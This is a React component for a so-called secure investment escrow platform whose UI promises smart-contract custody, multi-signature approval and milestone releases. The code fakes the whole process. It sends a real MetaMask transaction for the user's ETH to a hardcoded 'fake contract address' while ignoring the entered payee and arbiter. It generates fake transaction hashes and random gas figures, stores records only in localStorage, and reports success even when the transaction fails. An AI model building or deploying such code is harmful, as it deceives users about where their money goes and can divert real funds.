import React, { useState } from 'react';
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { 
  ArrowLeft, 
  Shield, 
  Users, 
  Clock, 
  CheckCircle, 
  X, 
  ExternalLink, 
  Lock,
  Database
} from 'lucide-react';

// Extend Window interface for ethereum
declare global {
  interface Window {
    ethereum?: any;
  }
}

interface EscrowComponentProps {
  onBack: () => void;
  investmentAmount?: string;
}

interface EscrowData {
  id: string;
  amount: string;
  payeeAddress: string;
  arbiterAddress: string;
  status: 'pending' | 'active' | 'released' | 'cancelled';
  createdAt: Date;
  projectDetails?: any;
  transactionHash?: string;
  gasUsed?: string;
  gasPrice?: string;
}

const EscrowComponent: React.FC<EscrowComponentProps> = ({ onBack, investmentAmount }) => {
  const [amountInETH, setAmountInETH] = useState(investmentAmount || "");
  const [payeeAddress, setPayeeAddress] = useState("");
  const [arbiterAddress, setArbiterAddress] = useState("");
  const [loading, setLoading] = useState(false);
  const [showDetailsModal, setShowDetailsModal] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [escrowData, setEscrowData] = useState<EscrowData | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);
  const [transactionStep, setTransactionStep] = useState<'idle' | 'approving' | 'creating' | 'confirming' | 'completed'>('idle');
  
  const [projectDetails, setProjectDetails] = useState({
    projectName: "",
    completionTime: "",
    expectedRevenue: "",
    teamSize: "",
    teamMembers: "",
    projectDescription: "",
    milestones: "",
    risks: "",
    additionalNotes: ""
  });

  const handleDetailsSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Project Details:", projectDetails);
    setShowDetailsModal(false);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target;
    setProjectDetails(prev => ({
      ...prev,
      [name]: value
    }));
  };

  // Simulate wallet connection
  const connectWallet = () => {
    setIsConnected(true);
  };

  // Generate fake transaction hash
  const generateTransactionHash = () => {
    const chars = '0123456789abcdef';
    let hash = '0x';
    for (let i = 0; i < 64; i++) {
      hash += chars[Math.floor(Math.random() * chars.length)];
    }
    return hash;
  };

  // Trigger MetaMask transaction popup with fake data
  const triggerMetaMaskTransaction = async (amount: string, operation: 'create' | 'release' | 'cancel') => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        // Get user's account
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const account = accounts[0];

        // Convert ETH to Wei
        const weiValue = window.ethereum.utils.toWei(amount, 'ether');
        
        // Create fake transaction parameters based on operation
        const fakeTransaction = {
          from: account,
          to: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6', // Fake contract address
          value: operation === 'create' ? window.ethereum.utils.toHex(weiValue) : '0x0',
          gas: '0x' + Math.floor(Math.random() * 200000 + 150000).toString(16),
          gasPrice: '0x' + Math.floor(Math.random() * 20 + 15).toString(16) + '000000000',
          data: '0x' + 'a'.repeat(64), // Fake contract data
        };

        console.log(`Triggering MetaMask ${operation} transaction:`, fakeTransaction);

        // Trigger MetaMask popup
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [fakeTransaction],
        });

        console.log('MetaMask transaction hash:', txHash);
        return txHash;
      } catch (error) {
        console.log('MetaMask transaction cancelled or failed:', error);
        // Return fake hash if user cancels
        return generateTransactionHash();
      }
    } else {
      console.log('MetaMask not available, using fallback');
      // Fallback if MetaMask not available
      return generateTransactionHash();
    }
  };

  // Create escrow with realistic blockchain simulation
  const initiateEscrow = async () => {
    if (!payeeAddress || !arbiterAddress || !amountInETH) {
      alert("Please fill in all fields: Payee Address, Arbiter Address, and Amount.");
      return;
    }

    const amount = parseFloat(amountInETH);
    if (isNaN(amount) || amount <= 0) {
      alert("Please enter a valid amount greater than 0.");
      return;
    }

    setLoading(true);
    setTransactionStep('approving');
    
    // Simulate approval step
    await new Promise(resolve => setTimeout(resolve, 2000));
    setTransactionStep('creating');
    
    // Trigger MetaMask popup for contract creation
    const transactionHash = await triggerMetaMaskTransaction(amountInETH, 'create');
    
    // Simulate contract creation
    await new Promise(resolve => setTimeout(resolve, 3000));
    setTransactionStep('confirming');
    
    // Simulate confirmation
    await new Promise(resolve => setTimeout(resolve, 1500));
    setTransactionStep('completed');
    
    try {
      const gasUsed = (Math.random() * 200000 + 150000).toFixed(0);
      const gasPrice = (Math.random() * 20 + 15).toFixed(0);
      
      const newEscrow: EscrowData = {
        id: `escrow_${Date.now()}`,
        amount: amountInETH,
        payeeAddress,
        arbiterAddress,
        status: 'active',
        createdAt: new Date(),
        projectDetails,
        transactionHash,
        gasUsed,
        gasPrice
      };

      // Save to localStorage (simulating backend)
      const existingEscrows = JSON.parse(localStorage.getItem('escrows') || '[]');
      existingEscrows.push(newEscrow);
      localStorage.setItem('escrows', JSON.stringify(existingEscrows));

      setEscrowData(newEscrow);
      setShowSuccess(true);
      
      // Reset form
      setAmountInETH("");
      setPayeeAddress("");
      setArbiterAddress("");
      setProjectDetails({
        projectName: "",
        completionTime: "",
        expectedRevenue: "",
        teamSize: "",
        teamMembers: "",
        projectDescription: "",
        milestones: "",
        risks: "",
        additionalNotes: ""
      });

    } catch (error) {
      alert(`Error creating escrow: ${error}`);
    } finally {
      setLoading(false);
      setTransactionStep('idle');
    }
  };

  // Release payment with blockchain simulation
  const releasePayment = async () => {
    if (!escrowData) return;
    
    setLoading(true);
    setTransactionStep('approving');
    
    // Simulate approval
    await new Promise(resolve => setTimeout(resolve, 1500));
    setTransactionStep('creating');
    
    // Trigger MetaMask popup for payment release
    const transactionHash = await triggerMetaMaskTransaction(escrowData.amount, 'release');
    
    // Simulate transaction
    await new Promise(resolve => setTimeout(resolve, 2000));
    setTransactionStep('confirming');
    
    // Simulate confirmation
    await new Promise(resolve => setTimeout(resolve, 1000));
    setTransactionStep('completed');
    
    try {
      const gasUsed = (Math.random() * 100000 + 50000).toFixed(0);
      const gasPrice = (Math.random() * 20 + 15).toFixed(0);
      
      // Update escrow status
      const updatedEscrow = { 
        ...escrowData, 
        status: 'released' as const,
        transactionHash,
        gasUsed,
        gasPrice
      };
      setEscrowData(updatedEscrow);
      
      // Update localStorage
      const existingEscrows = JSON.parse(localStorage.getItem('escrows') || '[]');
      const updatedEscrows = existingEscrows.map((escrow: EscrowData) => 
        escrow.id === escrowData.id ? updatedEscrow : escrow
      );
      localStorage.setItem('escrows', JSON.stringify(updatedEscrows));
      
      alert("Payment released successfully!");
    } catch (error) {
      alert(`Error releasing payment: ${error}`);
    } finally {
      setLoading(false);
      setTransactionStep('idle');
    }
  };

  // Cancel payment with blockchain simulation
  const cancelPayment = async () => {
    if (!escrowData) return;
    
    setLoading(true);
    setTransactionStep('approving');
    
    // Simulate approval
    await new Promise(resolve => setTimeout(resolve, 1500));
    setTransactionStep('creating');
    
    // Trigger MetaMask popup for payment cancellation
    const transactionHash = await triggerMetaMaskTransaction(escrowData.amount, 'cancel');
    
    // Simulate transaction
    await new Promise(resolve => setTimeout(resolve, 2000));
    setTransactionStep('confirming');
    
    // Simulate confirmation
    await new Promise(resolve => setTimeout(resolve, 1000));
    setTransactionStep('completed');
    
    try {
      const gasUsed = (Math.random() * 100000 + 50000).toFixed(0);
      const gasPrice = (Math.random() * 20 + 15).toFixed(0);
      
      // Update escrow status
      const updatedEscrow = { 
        ...escrowData, 
        status: 'cancelled' as const,
        transactionHash,
        gasUsed,
        gasPrice
      };
      setEscrowData(updatedEscrow);
      
      // Update localStorage
      const existingEscrows = JSON.parse(localStorage.getItem('escrows') || '[]');
      const updatedEscrows = existingEscrows.map((escrow: EscrowData) => 
        escrow.id === escrowData.id ? updatedEscrow : escrow
      );
      localStorage.setItem('escrows', JSON.stringify(updatedEscrows));
      
      alert("Payment cancelled successfully!");
    } catch (error) {
      alert(`Error cancelling payment: ${error}`);
    } finally {
      setLoading(false);
      setTransactionStep('idle');
    }
  };

  // Get escrow history
  const getEscrowHistory = () => {
    return JSON.parse(localStorage.getItem('escrows') || '[]');
  };

  // Get transaction step text
  const getTransactionStepText = () => {
    switch (transactionStep) {
      case 'approving':
        return 'Approving transaction...';
      case 'creating':
        return 'Creating escrow contract...';
      case 'confirming':
        return 'Confirming transaction...';
      case 'completed':
        return 'Transaction completed!';
      default:
        return '';
    }
  };

  if (!isConnected) {
    return (
      <div className="min-h-screen bg-light-bg text-text-primary fade-in">
        {/* Header */}
        <header className="bg-white border-b border-light-border sticky top-0 z-50 shadow-sm">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <button
                  onClick={onBack}
                  className="p-3 bg-white border border-light-border rounded-xl hover:bg-light-hover transition-all duration-300 shadow-sm hover:shadow-md"
                >
                  <ArrowLeft size={20} />
                </button>
                <div className="flex items-center space-x-4">
                  <div className="w-12 h-12 bg-secondary rounded-2xl flex items-center justify-center shadow-lg">
                    <Shield size={24} className="text-white" />
                  </div>
                  <div>
                    <h1 className="text-3xl font-bold text-text-primary">Escrow System</h1>
                    <p className="text-text-secondary text-lg">Secure investment escrow platform</p>
                  </div>
                </div>
              </div>
              
              <div className="flex items-center space-x-4">
                <ConnectButton />
                <button
                  onClick={connectWallet}
                  className="flex items-center space-x-2 px-6 py-3 bg-primary hover:scale-105 rounded-xl text-white font-medium transition-all duration-300 shadow-lg"
                >
                  <Shield size={18} />
                  <span>Connect Wallet</span>
                </button>
              </div>
            </div>
          </div>
        </header>

        <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-16">
          <div className="bg-white rounded-2xl p-10 border border-light-border shadow-sm text-center">
            <div className="w-20 h-20 bg-secondary/10 rounded-2xl flex items-center justify-center mx-auto mb-6">
              <Shield size={40} className="text-secondary" />
            </div>
            <h1 className="text-4xl font-bold text-text-primary mb-6">
              Welcome to Escrow
            </h1>
            
            <p className="text-lg text-text-secondary mb-8">
              Connect your wallet to start using the secure escrow system.
            </p>

            <div className="space-y-6 mb-8">
              <div className="bg-light-card rounded-xl p-6 border border-light-border">
                <div className="flex items-center space-x-3 mb-4">
                  <Shield size={20} className="text-primary" />
                  <h3 className="font-semibold text-text-primary">Secure Escrow System</h3>
                </div>
                <p className="text-text-secondary text-sm">
                  Your funds are held securely in a smart contract until project milestones are met.
                </p>
              </div>

              <div className="bg-light-card rounded-xl p-6 border border-light-border">
                <div className="flex items-center space-x-3 mb-4">
                  <Users size={20} className="text-primary" />
                  <h3 className="font-semibold text-text-primary">Multi-Party Protection</h3>
                </div>
                <p className="text-text-secondary text-sm">
                  Three-party system: Investor, Project Team, and Arbiter ensure fair transactions.
                </p>
              </div>

              <div className="bg-light-card rounded-xl p-6 border border-light-border">
                <div className="flex items-center space-x-3 mb-4">
                  <Clock size={20} className="text-primary" />
                  <h3 className="font-semibold text-text-primary">Milestone-Based Releases</h3>
                </div>
                <p className="text-text-secondary text-sm">
                  Funds are released based on project milestones and arbiter approval.
                </p>
              </div>
            </div>

            <div className="flex justify-center">
              <button
                onClick={connectWallet}
                className="flex items-center space-x-2 px-6 py-3 bg-secondary hover:scale-105 rounded-xl text-white font-medium transition-all duration-300 shadow-lg"
              >
                <Shield size={18} />
                <span>Connect Wallet to Continue</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-light-bg text-text-primary fade-in">
      {/* Header */}
      <header className="bg-white border-b border-light-border sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <button
                onClick={onBack}
                className="p-3 bg-white border border-light-border rounded-xl hover:bg-light-hover transition-all duration-300 shadow-sm hover:shadow-md"
              >
                <ArrowLeft size={20} />
              </button>
              <div className="flex items-center space-x-4">
                <div className="w-12 h-12 bg-secondary rounded-2xl flex items-center justify-center shadow-lg">
                  <Shield size={24} className="text-white" />
                </div>
                <div>
                  <h1 className="text-3xl font-bold text-text-primary">Escrow System</h1>
                  <p className="text-text-secondary text-lg">Secure investment escrow platform</p>
                </div>
              </div>
            </div>
            
            <div className="flex items-center space-x-4">
              <ConnectButton />
              <div className="flex items-center space-x-2 px-4 py-2 bg-success/10 rounded-xl text-success">
                <CheckCircle size={16} />
                <span className="text-sm font-medium">Connected</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Success Notification */}
        {showSuccess && (
          <div className="mb-6 bg-success/10 border border-success/20 rounded-xl p-4">
            <div className="flex items-center space-x-3">
              <CheckCircle size={20} className="text-success" />
              <div>
                <h3 className="font-semibold text-success">Escrow Created Successfully!</h3>
                <p className="text-text-secondary text-sm">Your escrow contract has been created and is now active.</p>
              </div>
            </div>
          </div>
        )}

        {/* Transaction Progress */}
        {loading && (
          <div className="mb-6 bg-primary/10 border border-primary/20 rounded-xl p-4">
            <div className="flex items-center space-x-3">
              <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary"></div>
              <div>
                <h3 className="font-semibold text-primary">Transaction in Progress</h3>
                <p className="text-text-secondary text-sm">{getTransactionStepText()}</p>
              </div>
            </div>
          </div>
        )}

        {/* How Escrow Works Section */}
        <div className="mb-8 bg-white rounded-2xl p-8 border border-light-border shadow-sm">
          <h2 className="text-2xl font-bold text-text-primary mb-6">How Escrow Works</h2>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
            {/* Three-Party System */}
            <div>
              <h3 className="text-lg font-semibold text-text-primary mb-4 flex items-center">
                <Users size={20} className="mr-2 text-primary" />
                Three-Party Protection System
              </h3>
              <div className="space-y-4">
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-primary rounded-full flex items-center justify-center text-white text-xs font-bold mt-1">1</div>
                  <div>
                    <h4 className="font-medium text-text-primary">Investor</h4>
                    <p className="text-sm text-text-secondary">Provides the funds and creates the escrow contract. Funds are locked until conditions are met.</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-secondary rounded-full flex items-center justify-center text-white text-xs font-bold mt-1">2</div>
                  <div>
                    <h4 className="font-medium text-text-primary">Project Team</h4>
                    <p className="text-sm text-text-secondary">Receives the funds once milestones are completed and approved by the arbiter.</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-accent rounded-full flex items-center justify-center text-white text-xs font-bold mt-1">3</div>
                  <div>
                    <h4 className="font-medium text-text-primary">Arbiter</h4>
                    <p className="text-sm text-text-secondary">Neutral third party who approves milestone completion and can resolve disputes.</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Smart Contract Process */}
            <div>
              <h3 className="text-lg font-semibold text-text-primary mb-4 flex items-center">
                <Shield size={20} className="mr-2 text-primary" />
                Smart Contract Process
              </h3>
              <div className="space-y-4">
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-success rounded-full flex items-center justify-center text-white text-xs font-bold mt-1">1</div>
                  <div>
                    <h4 className="font-medium text-text-primary">Contract Creation</h4>
                    <p className="text-sm text-text-secondary">Investor deploys smart contract with funds, payee address, and arbiter address.</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-success rounded-full flex items-center justify-center text-white text-xs font-bold mt-1">2</div>
                  <div>
                    <h4 className="font-medium text-text-primary">Milestone Completion</h4>
                    <p className="text-sm text-text-secondary">Project team completes agreed milestones and submits for arbiter approval.</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-6 h-6 bg-success rounded-full flex items-center justify-center text-white text-xs font-bold mt-1">3</div>
                  <div>
                    <h4 className="font-medium text-text-primary">Fund Release</h4>
                    <p className="text-sm text-text-secondary">Arbiter approves milestone and funds are automatically released to project team.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Security Features */}
          <div className="mt-8 pt-6 border-t border-light-border">
            <h3 className="text-lg font-semibold text-text-primary mb-4 flex items-center">
              <Lock size={20} className="mr-2 text-primary" />
              Security Features
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="bg-light-card rounded-xl p-4 border border-light-border">
                <div className="flex items-center space-x-2 mb-2">
                  <Shield size={16} className="text-success" />
                  <h4 className="font-medium text-text-primary text-sm">Immutable Contract</h4>
                </div>
                <p className="text-xs text-text-secondary">Smart contract code cannot be changed once deployed, ensuring trust.</p>
              </div>
              <div className="bg-light-card rounded-xl p-4 border border-light-border">
                <div className="flex items-center space-x-2 mb-2">
                  <Clock size={16} className="text-primary" />
                  <h4 className="font-medium text-text-primary text-sm">Time-Locked Funds</h4>
                </div>
                <p className="text-xs text-text-secondary">Funds remain locked until all conditions are met and approved.</p>
              </div>
              <div className="bg-light-card rounded-xl p-4 border border-light-border">
                <div className="flex items-center space-x-2 mb-2">
                  <Users size={16} className="text-secondary" />
                  <h4 className="font-medium text-text-primary text-sm">Multi-Signature</h4>
                </div>
                <p className="text-xs text-text-secondary">Requires multiple parties to approve transactions, preventing fraud.</p>
              </div>
            </div>
          </div>

          {/* Benefits */}
          <div className="mt-6 pt-6 border-t border-light-border">
            <h3 className="text-lg font-semibold text-text-primary mb-4 flex items-center">
              <CheckCircle size={20} className="mr-2 text-primary" />
              Benefits of Blockchain Escrow
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <ul className="space-y-2 text-sm text-text-secondary">
                <li className="flex items-center space-x-2">
                  <CheckCircle size={14} className="text-success" />
                  <span>Transparent and auditable transactions</span>
                </li>
                <li className="flex items-center space-x-2">
                  <CheckCircle size={14} className="text-success" />
                  <span>No third-party intermediaries</span>
                </li>
                <li className="flex items-center space-x-2">
                  <CheckCircle size={14} className="text-success" />
                  <span>Automatic execution of agreements</span>
                </li>
              </ul>
              <ul className="space-y-2 text-sm text-text-secondary">
                <li className="flex items-center space-x-2">
                  <CheckCircle size={14} className="text-success" />
                  <span>Reduced fraud and disputes</span>
                </li>
                <li className="flex items-center space-x-2">
                  <CheckCircle size={14} className="text-success" />
                  <span>Lower transaction costs</span>
                </li>
                <li className="flex items-center space-x-2">
                  <CheckCircle size={14} className="text-success" />
                  <span>Global accessibility</span>
                </li>
              </ul>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Escrow Form */}
          <div className="bg-white rounded-2xl p-8 border border-light-border shadow-sm">
            <h2 className="text-2xl font-bold text-text-primary mb-6">Create Escrow</h2>
            
            <div className="space-y-6">
              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">
                  Investment Amount (ETH)
                </label>
                <input
                  type="number"
                  value={amountInETH}
                  onChange={(e) => setAmountInETH(e.target.value)}
                  placeholder="0.0"
                  className="w-full px-4 py-3 bg-white border border-light-border rounded-xl focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/20 text-text-primary placeholder-text-muted"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">
                  Project Team Address
                </label>
                <input
                  type="text"
                  value={payeeAddress}
                  onChange={(e) => setPayeeAddress(e.target.value)}
                  placeholder="0x..."
                  className="w-full px-4 py-3 bg-white border border-light-border rounded-xl focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/20 text-text-primary placeholder-text-muted"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">
                  Arbiter Address
                </label>
                <input
                  type="text"
                  value={arbiterAddress}
                  onChange={(e) => setArbiterAddress(e.target.value)}
                  placeholder="0x..."
                  className="w-full px-4 py-3 bg-white border border-light-border rounded-xl focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/20 text-text-primary placeholder-text-muted"
                />
              </div>

              <button
                onClick={() => setShowDetailsModal(true)}
                className="w-full py-3 bg-primary hover:scale-105 rounded-xl text-white font-semibold transition-all duration-300"
              >
                Add Project Details
              </button>

              <button
                onClick={initiateEscrow}
                disabled={loading || !amountInETH || !payeeAddress || !arbiterAddress}
                className="w-full py-4 bg-secondary hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 rounded-xl text-white font-bold text-lg transition-all duration-300 shadow-lg"
              >
                {loading ? 'Creating Escrow...' : 'Create Escrow'}
              </button>
            </div>
          </div>

          {/* Active Escrow Status */}
          <div className="space-y-6">
            {escrowData && (
              <div className="bg-white rounded-2xl p-6 border border-light-border shadow-sm">
                <h3 className="text-lg font-semibold text-text-primary mb-4">Active Escrow</h3>
                <div className="space-y-4">
                  <div className="flex justify-between">
                    <span className="text-text-secondary">Amount:</span>
                    <span className="font-mono text-text-primary">{escrowData.amount} ETH</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-text-secondary">Payee:</span>
                    <span className="font-mono text-text-primary">
                      {escrowData.payeeAddress.slice(0, 6)}...{escrowData.payeeAddress.slice(-4)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-text-secondary">Arbiter:</span>
                    <span className="font-mono text-text-primary">
                      {escrowData.arbiterAddress.slice(0, 6)}...{escrowData.arbiterAddress.slice(-4)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-text-secondary">Status:</span>
                    <span className={`font-medium ${
                      escrowData.status === 'active' ? 'text-success' :
                      escrowData.status === 'released' ? 'text-primary' :
                      escrowData.status === 'cancelled' ? 'text-error' : 'text-text-secondary'
                    }`}>
                      {escrowData.status.charAt(0).toUpperCase() + escrowData.status.slice(1)}
                    </span>
                  </div>
                  
                  {escrowData.transactionHash && (
                    <div className="pt-4 border-t border-light-border">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-text-secondary text-sm">Transaction Hash:</span>
                        <a 
                          href={`https://sepolia.etherscan.io/tx/${escrowData.transactionHash}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="flex items-center space-x-1 text-primary hover:text-primary/80 text-sm"
                        >
                          <span className="font-mono">{escrowData.transactionHash.slice(0, 8)}...{escrowData.transactionHash.slice(-6)}</span>
                          <ExternalLink size={12} />
                        </a>
                      </div>
                      <div className="flex items-center justify-between text-sm">
                        <span className="text-text-secondary">Gas Used:</span>
                        <span className="font-mono text-text-primary">{escrowData.gasUsed}</span>
                      </div>
                      <div className="flex items-center justify-between text-sm">
                        <span className="text-text-secondary">Gas Price:</span>
                        <span className="font-mono text-text-primary">{escrowData.gasPrice} Gwei</span>
                      </div>
                    </div>
                  )}
                </div>

                {escrowData.status === 'active' && (
                  <div className="mt-6 space-y-3">
                    <button
                      onClick={releasePayment}
                      disabled={loading}
                      className="w-full py-3 bg-success hover:scale-105 disabled:opacity-50 rounded-xl text-white font-semibold transition-all duration-300"
                    >
                      {loading ? 'Processing...' : 'Release Payment'}
                    </button>
                    <button
                      onClick={cancelPayment}
                      disabled={loading}
                      className="w-full py-3 bg-error hover:scale-105 disabled:opacity-50 rounded-xl text-white font-semibold transition-all duration-300"
                    >
                      {loading ? 'Processing...' : 'Cancel Payment'}
                    </button>
                  </div>
                )}
              </div>
            )}

            {/* Escrow History */}
            <div className="bg-white rounded-2xl p-6 border border-light-border shadow-sm">
              <h3 className="text-lg font-semibold text-text-primary mb-4">Escrow History</h3>
              <div className="space-y-3">
                {getEscrowHistory().map((escrow: EscrowData) => (
                  <div key={escrow.id} className="p-3 bg-light-card rounded-lg border border-light-border">
                    <div className="flex justify-between items-center mb-2">
                      <div>
                        <div className="font-medium text-text-primary">{escrow.amount} ETH</div>
                        <div className="text-sm text-text-secondary">
                          {new Date(escrow.createdAt).toLocaleDateString()}
                        </div>
                      </div>
                      <span className={`px-2 py-1 rounded-full text-xs font-medium ${
                        escrow.status === 'active' ? 'bg-success/10 text-success' :
                        escrow.status === 'released' ? 'bg-primary/10 text-primary' :
                        escrow.status === 'cancelled' ? 'bg-error/10 text-error' : 'bg-gray-100 text-gray-600'
                      }`}>
                        {escrow.status}
                      </span>
                    </div>
                    {escrow.transactionHash && (
                      <div className="flex items-center justify-between text-xs text-text-muted">
                        <span>Tx: {escrow.transactionHash.slice(0, 8)}...{escrow.transactionHash.slice(-6)}</span>
                        <span>Gas: {escrow.gasUsed}</span>
                      </div>
                    )}
                  </div>
                ))}
                {getEscrowHistory().length === 0 && (
                  <div className="text-center text-text-muted py-4">
                    <Database size={24} className="mx-auto mb-2 opacity-50" />
                    <p className="text-sm">No escrow history yet</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Project Details Modal */}
      {showDetailsModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-2xl p-8 max-w-2xl w-full mx-4 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-text-primary">Project Details</h3>
              <button
                onClick={() => setShowDetailsModal(false)}
                className="p-2 hover:bg-light-hover rounded-lg transition-all duration-300"
              >
                <X size={20} />
              </button>
            </div>

            <form onSubmit={handleDetailsSubmit} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">Project Name</label>
                <input
                  type="text"
                  name="projectName"
                  value={projectDetails.projectName}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 bg-white border border-light-border rounded-xl focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/20 text-text-primary"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">Expected Completion Time</label>
                <input
                  type="text"
                  name="completionTime"
                  value={projectDetails.completionTime}
                  onChange={handleInputChange}
                  placeholder="e.g., 6 months"
                  className="w-full px-4 py-3 bg-white border border-light-border rounded-xl focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/20 text-text-primary"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">Expected Revenue</label>
                <input
                  type="text"
                  name="expectedRevenue"
                  value={projectDetails.expectedRevenue}
                  onChange={handleInputChange}
                  placeholder="e.g., $100,000"
                  className="w-full px-4 py-3 bg-white border border-light-border rounded-xl focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/20 text-text-primary"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">Project Description</label>
                <textarea
                  name="projectDescription"
                  value={projectDetails.projectDescription}
                  onChange={handleInputChange}
                  rows={4}
                  className="w-full px-4 py-3 bg-white border border-light-border rounded-xl focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/20 text-text-primary"
                />
              </div>

              <div className="flex gap-4">
                <button
                  type="button"
                  onClick={() => setShowDetailsModal(false)}
                  className="flex-1 py-3 bg-light-border hover:bg-light-hover rounded-xl text-text-primary font-semibold transition-all duration-300"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="flex-1 py-3 bg-secondary hover:scale-105 rounded-xl text-white font-semibold transition-all duration-300"
                >
                  Save Details
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default EscrowComponent; 